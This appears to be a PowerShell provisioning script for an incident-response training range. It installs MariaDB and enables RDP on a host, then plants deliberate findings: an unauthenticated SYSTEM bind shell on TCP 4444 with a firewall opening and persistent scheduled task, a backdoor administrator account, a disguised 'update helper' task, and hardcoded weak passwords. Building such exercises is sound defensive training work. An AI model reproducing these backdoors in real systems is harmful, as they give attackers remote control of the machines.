#requires -Version 5.1
#requires -RunAsAdministrator
[CmdletBinding()]
param(
    [Parameter()]
    [ValidatePattern('^[0-9a-fA-F:.]+$')]
    [string]$ManifestIp = '172.16.1.40',

    [Parameter()]
    [ValidatePattern('^[0-9a-fA-F:.]+$')]
    [string]$GuidanceIp = '172.16.1.10',

    [Parameter()]
    [ValidatePattern('^[0-9a-fA-F:.]+$')]
    [string]$AssemblyIp = '172.16.1.30',

    [Parameter()]
    [string]$StarterPassword = 'H00ves0nTheM00n',

    [Parameter()]
    [string]$RootPassword = 'Fortuna-Root-Change-Me-2026!',

    [Parameter()]
    [ValidatePattern('^[0-9]+\.[0-9]+\.[0-9]+$')]
    [string]$MariaDbVersion = '13.1.1',

    [Parameter()]
    [switch]$SkipTrainingArtifacts
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

foreach ($candidate in @($StarterPassword, $RootPassword)) {
    if ($candidate.Contains("'") -or $candidate.Contains('\') -or $candidate.Contains("`r") -or $candidate.Contains("`n")) {
        throw 'Passwords cannot contain a single quote, backslash, or newline.'
    }
}

$ProgramRoot = 'C:\ProgramData\IHPL'
$DownloadRoot = Join-Path $ProgramRoot 'Downloads'
$LogRoot = Join-Path $ProgramRoot 'Logs'
$MariaData = 'C:\ProgramData\MariaDB\data'
$MariaBase = "C:\Program Files\MariaDB $MariaDbVersion"
$MariaConfig = 'C:\ProgramData\MariaDB\my.ini'
$SeedSqlPath = Join-Path $ProgramRoot 'seed-runtime.sql'
$ClientDefaults = Join-Path $ProgramRoot 'root-client.ini'
New-Item -ItemType Directory -Force -Path $ProgramRoot, $DownloadRoot, $LogRoot, (Split-Path $MariaData), $MariaData | Out-Null
Start-Transcript -Path (Join-Path $LogRoot 'manifest-setup.log') -Append | Out-Null

function Get-IhplLocalUser {
    [CmdletBinding()]
    param([Parameter(Mandatory)][string]$Name)

    $netExe = Join-Path $env:SystemRoot 'System32\net.exe'
    $previousErrorActionPreference = $ErrorActionPreference
    try {
        $ErrorActionPreference = 'SilentlyContinue'
        & $netExe user $Name *> $null
        $userExists = ($LASTEXITCODE -eq 0)
    }
    finally {
        $ErrorActionPreference = $previousErrorActionPreference
    }
    if (-not $userExists) { return $null }

    $entry = [ADSI]("WinNT://{0}/{1},user" -f $env:COMPUTERNAME, $Name)
    $entry.RefreshCache()
    return $entry
}

function Add-IhplLocalGroupMember {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][System.DirectoryServices.DirectoryEntry]$User,
        [Parameter(Mandatory)][string]$Group
    )

    if (-not (Test-IhplLocalGroupMember -User $User -Group $Group)) {
        $groupEntry = [ADSI]("WinNT://{0}/{1},group" -f $env:COMPUTERNAME, $Group)
        $null = $groupEntry.psbase.NativeObject
        $memberPath = [string]$User.Path
        $groupEntry.psbase.Invoke('Add', @($memberPath))
    }
}

function Test-IhplLocalGroupMember {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][System.DirectoryServices.DirectoryEntry]$User,
        [Parameter(Mandatory)][string]$Group
    )

    $groupEntry = [ADSI]("WinNT://{0}/{1},group" -f $env:COMPUTERNAME, $Group)
    $null = $groupEntry.psbase.NativeObject
    $userName = [string]$User.Properties['Name'].Value
    foreach ($member in @($groupEntry.psbase.Invoke('Members'))) {
        $memberName = [string]$member.GetType().InvokeMember(
            'Name',
            [System.Reflection.BindingFlags]::GetProperty,
            $null,
            $member,
            $null
        )
        if ($memberName.Equals($userName, [System.StringComparison]::OrdinalIgnoreCase)) {
            return $true
        }
    }
    return $false
}

function Ensure-IhplLocalUser {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][string]$Name,
        [Parameter(Mandatory)][string]$Password,
        [Parameter()][string[]]$Groups = @(),
        [Parameter()][string]$Description = '',
        [Parameter()][switch]$Disabled
    )

    $netExe = Join-Path $env:SystemRoot 'System32\net.exe'
    $user = Get-IhplLocalUser -Name $Name
    if ($null -eq $user) {
        # /Y accepts net.exe's legacy confirmation for passwords longer than 14 characters.
        $netOutput = & $netExe user $Name $Password /add /Y 2>&1
    }
    else {
        $netOutput = & $netExe user $Name $Password 2>&1
    }
    if ($LASTEXITCODE -ne 0) {
        throw "Failed to create or update local account $Name with net.exe: $($netOutput -join ' ')"
    }

    $user = Get-IhplLocalUser -Name $Name
    if ($null -eq $user) {
        throw "Local account $Name was created but could not be reopened."
    }

    if ($Description) {
        $user.Put('Description', $Description)
    }

    $user.RefreshCache()
    $flags = [int]$user.Properties['UserFlags'].Value
    $flags = $flags -bor 0x10000
    if ($Disabled) {
        $flags = $flags -bor 0x2
    }
    else {
        $flags = $flags -band (-bnot 0x2)
    }
    $user.Put('UserFlags', $flags)
    $user.SetInfo()

    foreach ($group in $Groups) {
        Add-IhplLocalGroupMember -User $user -Group $group
    }
}

function Assert-IhplScoredAccounts {
    [CmdletBinding()]
    param()

    $plinktern = Get-IhplLocalUser -Name 'plinktern'
    $jmoney = Get-IhplLocalUser -Name 'jmoney'
    foreach ($account in @($plinktern, $jmoney)) {
        if ($null -eq $account) {
            throw 'Required local accounts plinktern and jmoney were not both created.'
        }
        $account.RefreshCache()
        if (([int]$account.Properties['UserFlags'].Value -band 0x2) -ne 0) {
            throw "Required local account $($account.Name) is disabled."
        }
    }

    if (-not (Test-IhplLocalGroupMember -User $plinktern -Group 'Administrators')) {
        throw 'plinktern is not a member of the local Administrators group.'
    }
    if (-not (Test-IhplLocalGroupMember -User $plinktern -Group 'Remote Desktop Users')) {
        throw 'plinktern is not a member of Remote Desktop Users.'
    }
    if (-not (Test-IhplLocalGroupMember -User $jmoney -Group 'Remote Desktop Users')) {
        throw 'jmoney is not a member of Remote Desktop Users.'
    }
}

function Start-IhplScheduledTaskDetached {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][string]$TaskName,
        [Parameter(Mandatory)][string]$TaskPath
    )

    $normalizedTaskPath = if ($TaskPath.EndsWith('\')) { $TaskPath } else { "$TaskPath\" }
    $fullTaskName = "$normalizedTaskPath$TaskName"
    $schtasksExe = Join-Path $env:SystemRoot 'System32\schtasks.exe'
    $previousErrorActionPreference = $ErrorActionPreference
    try {
        # schtasks.exe only asks the Task Scheduler service to launch the task; it
        # returns immediately and never waits for the long-running task process.
        $ErrorActionPreference = 'Continue'
        $taskOutput = @(& $schtasksExe /Run /TN $fullTaskName 2>&1)
        $taskExitCode = $LASTEXITCODE
    }
    finally {
        $ErrorActionPreference = $previousErrorActionPreference
    }

    if ($taskExitCode -ne 0) {
        $taskDetails = ($taskOutput | ForEach-Object { $_.ToString() }) -join [Environment]::NewLine
        throw "Unable to start scheduled task $fullTaskName (exit $taskExitCode). $taskDetails"
    }
}

function Install-IhplTrainingArtifacts {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][string]$MariaData,
        [Parameter(Mandatory)][string]$StarterPassword
    )

    $trainingRoot = 'C:\ProgramData\IHPL\Training'
    New-Item -ItemType Directory -Force -Path $trainingRoot | Out-Null

    $taskService = New-Object -ComObject 'Schedule.Service'
    $taskService.Connect()
    try {
        $null = $taskService.GetFolder('\IHPL')
    }
    catch {
        $null = $taskService.GetFolder('\').CreateFolder('IHPL')
    }

    Ensure-IhplLocalUser -Name 'dbmaint' -Password $StarterPassword -Groups @('Administrators', 'Remote Desktop Users') -Description 'Legacy database maintenance account'

    $listenerScript = Join-Path $trainingRoot 'local-diagnostics-listener.ps1'
    @'
$endpoint = [Net.IPEndPoint]::new([Net.IPAddress]::Any, 4444)
$listener = [Net.Sockets.TcpListener]::new($endpoint)
$listener.Start()
try {
    while ($true) {
        $client = $listener.AcceptTcpClient()
        try {
            $stream = $client.GetStream()
            $reader = [IO.StreamReader]::new($stream)
            $writer = [IO.StreamWriter]::new($stream)
            $writer.AutoFlush = $true
            $writer.WriteLine('Manifest diagnostics shell')
            while ($client.Connected) {
                $writer.Write('cmd> ')
                $command = $reader.ReadLine()
                if ($null -eq $command -or $command -eq 'exit') { break }
                $output = (& $env:ComSpec /d /c $command 2>&1 | Out-String)
                $writer.Write($output)
            }
        }
        finally { $client.Dispose() }
    }
}
finally { $listener.Stop() }
'@ | Set-Content -LiteralPath $listenerScript -Encoding UTF8

    $windowsPowerShell = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
    $listenerTaskName = 'IHPL Local Diagnostics'
    $listenerTaskPath = '\IHPL\'
    $listenerAction = New-ScheduledTaskAction -Execute $windowsPowerShell -Argument "-NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -File `"$listenerScript`"" -WorkingDirectory $trainingRoot
    $startup = New-ScheduledTaskTrigger -AtStartup
    $system = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    $persistent = New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew -StartWhenAvailable
    Stop-ScheduledTask -TaskName $listenerTaskName -TaskPath $listenerTaskPath -ErrorAction SilentlyContinue
    Register-ScheduledTask -TaskName $listenerTaskName -TaskPath $listenerTaskPath -Action $listenerAction -Trigger $startup -Principal $system -Settings $persistent -Force | Out-Null
    Remove-NetFirewallRule -DisplayName 'IHPL Local Diagnostics 4444' -ErrorAction SilentlyContinue
    New-NetFirewallRule -DisplayName 'IHPL Local Diagnostics 4444' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444 -Profile Any | Out-Null
    Start-IhplScheduledTaskDetached -TaskName $listenerTaskName -TaskPath $listenerTaskPath

    $listenerReady = $false
    for ($attempt = 1; $attempt -le 40; $attempt++) {
        $listenerTask = Get-ScheduledTask -TaskName $listenerTaskName -TaskPath $listenerTaskPath -ErrorAction SilentlyContinue
        $listenerSocket = Get-NetTCPConnection -LocalPort 4444 -State Listen -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($null -ne $listenerTask -and $listenerTask.State -eq 'Running' -and $null -ne $listenerSocket) {
            $listenerReady = $true
            break
        }
        Start-Sleep -Milliseconds 250
    }
    if (-not $listenerReady) {
        throw 'The detached IHPL Local Diagnostics task did not begin listening on TCP 4444 within 10 seconds.'
    }

    $heartbeatScript = Join-Path $trainingRoot 'manifest-indexer.ps1'
    @'
"$(Get-Date -Format o) local training heartbeat" | Add-Content -LiteralPath 'C:\ProgramData\IHPL\Training\manifest-indexer.log'
'@ | Set-Content -LiteralPath $heartbeatScript -Encoding UTF8
    $heartbeatAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoLogo -NoProfile -NonInteractive -File `"$heartbeatScript`""
    $minuteTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
    Register-ScheduledTask -TaskName 'IHPL Manifest Indexer' -TaskPath '\IHPL\' -Action $heartbeatAction -Trigger $minuteTrigger -Principal $system -Force | Out-Null

    $helperTaskName = 'IHPL Windows Update Helper'
    $helperPath = Join-Path $trainingRoot 'win-update-helper.exe.training'
    Stop-ScheduledTask -TaskName $helperTaskName -TaskPath '\IHPL\' -ErrorAction SilentlyContinue

    $helperIsValid = $false
    if (Test-Path -LiteralPath $helperPath) {
        try {
            $null = [Reflection.AssemblyName]::GetAssemblyName($helperPath)
            $helperAscii = [Text.Encoding]::ASCII.GetString([IO.File]::ReadAllBytes($helperPath))
            $helperIsValid = $helperAscii.Contains('bishop')
        }
        catch {
            $helperIsValid = $false
        }
    }

    if (-not $helperIsValid) {
        Get-CimInstance -ClassName Win32_Process -ErrorAction SilentlyContinue |
            Where-Object { [string]::Equals([string]$_.ExecutablePath, $helperPath, [StringComparison]::OrdinalIgnoreCase) } |
            ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
        Remove-Item -LiteralPath $helperPath -Force -ErrorAction SilentlyContinue

        $helperBuildId = [Guid]::NewGuid()
        $helperTypeName = "WinUpdateHelper$($helperBuildId.ToString('N'))"
        $helperSource = @"
using System;
using System.IO;
using System.Reflection;
using System.Threading;

[assembly: AssemblyDescription("bishop")]

namespace IhplTraining
{
    internal static class $helperTypeName
    {
        private const string Marker = "bishop";
        private const string LogPath = @"C:\ProgramData\IHPL\Training\win-update-helper.log";

        private static void Main()
        {
            while (true)
            {
                try
                {
                    File.AppendAllText(
                        LogPath,
                        DateTime.UtcNow.ToString("o") + " " + Marker + " local-only training heartbeat" + Environment.NewLine
                    );
                }
                catch
                {
                    // Keep the disconnected process alive if the training log is temporarily unavailable.
                }
                Thread.Sleep(TimeSpan.FromMinutes(1));
            }
        }
    }
}
"@

        $helperBuildPath = Join-Path $env:TEMP ("win-update-helper-{0}.exe" -f $helperBuildId.ToString('N'))
        try {
            Add-Type -TypeDefinition $helperSource -Language CSharp -OutputAssembly $helperBuildPath -OutputType WindowsApplication | Out-Null

            # Append an ASCII marker so basic forensic string searches find the required indicator.
            $helperMarker = [Text.Encoding]::ASCII.GetBytes("`r`nIHPL-TRAINING:bishop`r`n")
            $helperStream = [IO.File]::Open($helperBuildPath, [IO.FileMode]::Append, [IO.FileAccess]::Write, [IO.FileShare]::None)
            try {
                $helperStream.Write($helperMarker, 0, $helperMarker.Length)
            }
            finally {
                $helperStream.Dispose()
            }

            $helperAscii = [Text.Encoding]::ASCII.GetString([IO.File]::ReadAllBytes($helperBuildPath))
            if (-not $helperAscii.Contains('bishop')) {
                throw 'win-update-helper.exe.training does not contain the required bishop marker.'
            }
            Move-Item -LiteralPath $helperBuildPath -Destination $helperPath -Force
        }
        finally {
            Remove-Item -LiteralPath $helperBuildPath -Force -ErrorAction SilentlyContinue
        }
    }

    $helperRunner = Join-Path $trainingRoot 'win-update-helper-loader.ps1'
    @'
$ErrorActionPreference = 'Stop'
$helperPath = 'C:\ProgramData\IHPL\Training\win-update-helper.exe.training'
$loaderErrorPath = 'C:\ProgramData\IHPL\Training\win-update-helper-loader-error.log'
Remove-Item -LiteralPath $loaderErrorPath -Force -ErrorAction SilentlyContinue
try {
    $helperAssembly = [Reflection.Assembly]::LoadFile($helperPath)
    $helperEntryPoint = $helperAssembly.EntryPoint
    if ($null -eq $helperEntryPoint) {
        throw 'win-update-helper.exe.training has no managed entry point.'
    }
    $null = $helperEntryPoint.Invoke($null, [object[]]@())
}
catch {
    ($_ | Out-String) | Set-Content -LiteralPath $loaderErrorPath -Encoding UTF8
    throw
}
'@ | Set-Content -LiteralPath $helperRunner -Encoding UTF8

    # Task Scheduler cannot launch a PE through the nonstandard .training suffix
    # directly. The SYSTEM loader invokes that assembly's real entry point.
    $helperAction = New-ScheduledTaskAction -Execute $windowsPowerShell -Argument "-NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -File `"$helperRunner`"" -WorkingDirectory $trainingRoot
    $helperSettings = New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew -StartWhenAvailable
    Register-ScheduledTask -TaskName $helperTaskName -TaskPath '\IHPL\' -Action $helperAction -Trigger $startup -Principal $system -Settings $helperSettings -Force | Out-Null
    $helperStartTime = [DateTime]::UtcNow
    Start-IhplScheduledTaskDetached -TaskName $helperTaskName -TaskPath '\IHPL\'

    $helperLog = Join-Path $trainingRoot 'win-update-helper.log'
    $helperReady = $false
    for ($attempt = 1; $attempt -le 40; $attempt++) {
        $helperTask = Get-ScheduledTask -TaskName $helperTaskName -TaskPath '\IHPL\' -ErrorAction SilentlyContinue
        $helperLogItem = Get-Item -LiteralPath $helperLog -ErrorAction SilentlyContinue
        $helperHeartbeat = if ($null -ne $helperLogItem) {
            Select-String -LiteralPath $helperLog -SimpleMatch 'bishop local-only training heartbeat' -Quiet
        }
        else {
            $false
        }
        if (
            $null -ne $helperTask -and
            $helperTask.State -eq 'Running' -and
            $null -ne $helperLogItem -and
            $helperLogItem.LastWriteTimeUtc -ge $helperStartTime.AddSeconds(-1) -and
            $helperHeartbeat
        ) {
            $helperReady = $true
            break
        }
        Start-Sleep -Milliseconds 250
    }
    if (-not $helperReady) {
        $helperTaskInfo = Get-ScheduledTaskInfo -TaskName $helperTaskName -TaskPath '\IHPL\' -ErrorAction SilentlyContinue
        $helperLastResult = if ($null -ne $helperTaskInfo) { $helperTaskInfo.LastTaskResult } else { 'unavailable' }
        $loaderErrorPath = Join-Path $trainingRoot 'win-update-helper-loader-error.log'
        $loaderError = if (Test-Path -LiteralPath $loaderErrorPath) {
            (Get-Content -LiteralPath $loaderErrorPath -Raw).Trim()
        }
        else {
            'No loader error was recorded.'
        }
        throw "The persistent win-update-helper.exe.training entry point did not produce a heartbeat within 10 seconds. Task result: $helperLastResult. Loader: $loaderError"
    }

    if (Test-Path -LiteralPath $MariaData) {
        & icacls.exe $MariaData /grant '*S-1-5-32-545:(OI)(CI)RX' /T /C | Out-Null
    }

    Write-Host '[Manifest] Functional findings installed; the running Sliver and IMIX indicators remain disconnected from C2.'
}

function Save-VerifiedArchive {
    param(
        [Parameter(Mandatory)][uri]$ArchiveUri,
        [Parameter(Mandatory)][uri[]]$ChecksumUris,
        [Parameter(Mandatory)][string]$Destination
    )

    $checksumPath = "$Destination.sha256"
    if (-not (Test-Path -LiteralPath $Destination)) {
        Invoke-WebRequest -UseBasicParsing -Uri $ArchiveUri -OutFile $Destination
    }

    $archiveName = [IO.Path]::GetFileName($Destination)
    $escapedArchiveName = [regex]::Escape($archiveName)
    $patterns = @(
        "(?im)^([0-9a-f]{64})[ \t]+\*?(?:[^\r\n]*[\\/])?$escapedArchiveName[ \t]*$",
        "(?im)^SHA256 \((?:[^\r\n]*[\\/])?$escapedArchiveName\)[ \t]*=[ \t]*([0-9a-f]{64})[ \t]*$",
        "(?i)^\s*([0-9a-f]{64})\s*(?:\*?$escapedArchiveName)?\s*$"
    )
    $expectedHash = $null
    $checksumFailures = [Collections.Generic.List[string]]::new()

    foreach ($checksumUri in $ChecksumUris) {
        try {
            Invoke-WebRequest -UseBasicParsing -Uri $checksumUri -OutFile $checksumPath
        }
        catch {
            $checksumFailures.Add("$checksumUri ($($_.Exception.Message))")
            continue
        }

        $checksumText = Get-Content -LiteralPath $checksumPath -Raw
        foreach ($pattern in $patterns) {
            $match = [regex]::Match($checksumText, $pattern)
            if ($match.Success) {
                $expectedHash = $match.Groups[1].Value.ToUpperInvariant()
                break
            }
        }
        if ($null -ne $expectedHash) { break }
        $checksumFailures.Add("$checksumUri (no digest for $archiveName)")
    }

    if ($null -eq $expectedHash) {
        throw "No published SHA-256 digest was found for $archiveName. Tried: $($checksumFailures -join '; ')"
    }

    $actual = (Get-FileHash -LiteralPath $Destination -Algorithm SHA256).Hash
    if ($actual -ne $expectedHash) { throw "SHA-256 verification failed for $Destination." }
    Remove-Item -LiteralPath $checksumPath -Force -ErrorAction SilentlyContinue
}

try {
    Write-Host '[Manifest] Enabling RDP and creating scored accounts...'
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Type DWord -Value 0
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name UserAuthentication -Type DWord -Value 1
    if (-not (Get-NetFirewallRule -DisplayName 'IHPL RDP 3389' -ErrorAction SilentlyContinue)) {
        New-NetFirewallRule -DisplayName 'IHPL RDP 3389' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -Profile Any | Out-Null
    }
    Ensure-IhplLocalUser -Name 'plinktern' -Password $StarterPassword -Groups @('Administrators', 'Remote Desktop Users')
    Ensure-IhplLocalUser -Name 'jmoney' -Password $StarterPassword -Groups @('Remote Desktop Users')
    Assert-IhplScoredAccounts

    $archiveName = "mariadb-$MariaDbVersion-winx64.zip"
    $archivePath = Join-Path $DownloadRoot $archiveName
    $versionRoot = "https://archive.mariadb.org/mariadb-$MariaDbVersion"
    $archiveUri = "$versionRoot/winx64-packages/$archiveName"
    $checksumUris = @(
        "$versionRoot/sha256sums.txt",
        "$versionRoot/sha256sums",
        "$versionRoot/winx64-packages/sha256sums.txt",
        "$versionRoot/winx64-packages/sha256sums",
        "$archiveUri.sha256",
        "$archiveUri.sha256.txt"
    )
    Write-Host "[Manifest] Downloading and verifying MariaDB $MariaDbVersion..."
    Save-VerifiedArchive -ArchiveUri $archiveUri -ChecksumUris $checksumUris -Destination $archivePath

    if (-not (Test-Path -LiteralPath (Join-Path $MariaBase 'bin\mariadbd.exe'))) {
        $extractRoot = Join-Path $DownloadRoot "mariadb-$MariaDbVersion-extracted"
        if (Test-Path -LiteralPath $extractRoot) { Remove-Item -LiteralPath $extractRoot -Recurse -Force }
        Expand-Archive -LiteralPath $archivePath -DestinationPath $extractRoot -Force
        $sourceRoot = Get-ChildItem -LiteralPath $extractRoot -Directory | Where-Object { Test-Path -LiteralPath (Join-Path $_.FullName 'bin\mariadbd.exe') } | Select-Object -First 1
        if ($null -eq $sourceRoot) { throw 'The MariaDB archive did not contain bin\mariadbd.exe.' }
        New-Item -ItemType Directory -Force -Path $MariaBase | Out-Null
        Copy-Item -Path (Join-Path $sourceRoot.FullName '*') -Destination $MariaBase -Recurse -Force
    }

    $config = @"
[client]
port=3306

[mysqld]
basedir="$($MariaBase.Replace('\','/'))"
datadir="$($MariaData.Replace('\','/'))"
port=3306
bind-address=0.0.0.0
skip-name-resolve
character-set-server=utf8mb4
collation-server=utf8mb4_unicode_ci
log-error=$($LogRoot.Replace('\','/'))/mariadb-error.log
"@
    Set-Content -LiteralPath $MariaConfig -Value $config -Encoding ASCII

    $serverExe = Join-Path $MariaBase 'bin\mariadbd.exe'
    $installDbExe = Join-Path $MariaBase 'bin\mariadb-install-db.exe'
    if (-not (Test-Path -LiteralPath $installDbExe)) { $installDbExe = Join-Path $MariaBase 'bin\mysql_install_db.exe' }
    if (-not (Test-Path -LiteralPath (Join-Path $MariaData 'mysql'))) {
        if (-not (Test-Path -LiteralPath $installDbExe)) { throw 'MariaDB database initialization utility was not found.' }
        & $installDbExe "--datadir=$MariaData" "--password=$RootPassword"
        if ($LASTEXITCODE -ne 0) { throw "MariaDB initialization exited with $LASTEXITCODE." }
    }

    $serviceName = 'MariaDB'
    $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
    if ($null -eq $service) {
        $previousErrorActionPreference = $ErrorActionPreference
        try {
            # MariaDB handles service registration only when --install is argv[1].
            $ErrorActionPreference = 'Continue'
            $registrationOutput = @(& $serverExe --install $serviceName "--defaults-file=$MariaConfig" 2>&1)
            $registrationExitCode = $LASTEXITCODE
        }
        finally {
            $ErrorActionPreference = $previousErrorActionPreference
        }

        $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
        if ($registrationExitCode -ne 0 -or $null -eq $service) {
            $registrationDetails = ($registrationOutput | ForEach-Object { $_.ToString() }) -join [Environment]::NewLine
            throw "MariaDB service registration exited with $registrationExitCode. $registrationDetails"
        }
    }
    Set-Service -Name $serviceName -StartupType Automatic
    $service = Get-Service -Name $serviceName
    if ($service.Status -ne 'Running') {
        Start-Service -Name $serviceName
    }
    (Get-Service -Name $serviceName).WaitForStatus('Running', [TimeSpan]::FromSeconds(30))

    for ($attempt = 1; $attempt -le 30; $attempt++) {
        if ((Get-NetTCPConnection -LocalPort 3306 -State Listen -ErrorAction SilentlyContinue)) { break }
        if ($attempt -eq 30) { throw 'MariaDB did not listen on TCP 3306.' }
        Start-Sleep -Seconds 2
    }

    Write-Host '[Manifest] Seeding PlinkCom database and service accounts...'
    $schemaSql = Get-Content -LiteralPath (Join-Path $PSScriptRoot 'schema.sql') -Raw
    $accountSql = @"

CREATE USER IF NOT EXISTS 'jmoney'@'$GuidanceIp' IDENTIFIED BY '$StarterPassword';
ALTER USER 'jmoney'@'$GuidanceIp' IDENTIFIED BY '$StarterPassword';
GRANT SELECT ON plinkcom.* TO 'jmoney'@'$GuidanceIp';
GRANT UPDATE ON plinkcom.users TO 'jmoney'@'$GuidanceIp';
GRANT UPDATE ON plinkcom.rockets TO 'jmoney'@'$GuidanceIp';
CREATE USER IF NOT EXISTS 'jmoney'@'localhost' IDENTIFIED BY '$StarterPassword';
ALTER USER 'jmoney'@'localhost' IDENTIFIED BY '$StarterPassword';
GRANT SELECT ON plinkcom.* TO 'jmoney'@'localhost';
CREATE USER IF NOT EXISTS 'plinktern'@'localhost' IDENTIFIED BY '$StarterPassword';
ALTER USER 'plinktern'@'localhost' IDENTIFIED BY '$StarterPassword';
GRANT ALL PRIVILEGES ON plinkcom.* TO 'plinktern'@'localhost';
CREATE USER IF NOT EXISTS 'telemetry_admin'@'localhost' IDENTIFIED BY 'Telemetry-Admin-2026!';
GRANT ALL PRIVILEGES ON *.* TO 'telemetry_admin'@'localhost' WITH GRANT OPTION;
FLUSH PRIVILEGES;
"@
    Set-Content -LiteralPath $SeedSqlPath -Value ($schemaSql + $accountSql) -Encoding UTF8
    @"
[client]
user=root
password=$RootPassword
host=127.0.0.1
port=3306
"@ | Set-Content -LiteralPath $ClientDefaults -Encoding ASCII
    $acl = Get-Acl -LiteralPath $ClientDefaults
    $acl.SetAccessRuleProtection($true, $false)
    $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule('SYSTEM', 'FullControl', 'Allow')
    $adminRule = New-Object System.Security.AccessControl.FileSystemAccessRule('BUILTIN\Administrators', 'FullControl', 'Allow')
    $acl.AddAccessRule($systemRule)
    $acl.AddAccessRule($adminRule)
    Set-Acl -LiteralPath $ClientDefaults -AclObject $acl
    $clientExe = Join-Path $MariaBase 'bin\mariadb.exe'
    if (-not (Test-Path -LiteralPath $clientExe)) { $clientExe = Join-Path $MariaBase 'bin\mysql.exe' }
    $sourceCommand = "source $($SeedSqlPath.Replace('\','/'))"
    & $clientExe "--defaults-extra-file=$ClientDefaults" "--execute=$sourceCommand"
    if ($LASTEXITCODE -ne 0) { throw "MariaDB seed exited with $LASTEXITCODE." }
    Remove-Item -LiteralPath $SeedSqlPath, $ClientDefaults -Force

    Remove-NetFirewallRule -DisplayName 'IHPL MariaDB 3306' -ErrorAction SilentlyContinue
    New-NetFirewallRule -DisplayName 'IHPL MariaDB 3306' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3306 -RemoteAddress @($GuidanceIp, $AssemblyIp) -Profile Any | Out-Null

    if (-not $SkipTrainingArtifacts) {
        Write-Host '[Manifest] Planting incident-response findings...'
        Install-IhplTrainingArtifacts -MariaData $MariaData -StarterPassword $StarterPassword
    }

    if ((Get-Service -Name MariaDB).Status -ne 'Running') { throw 'MariaDB is not running.' }
    Write-Host "[Manifest] Ready: MariaDB $MariaDbVersion at $ManifestIp`:3306"
}
finally {
    foreach ($temporaryFile in @($SeedSqlPath, $ClientDefaults)) {
        if (Test-Path -LiteralPath $temporaryFile) { Remove-Item -LiteralPath $temporaryFile -Force }
    }
    Stop-Transcript | Out-Null
}
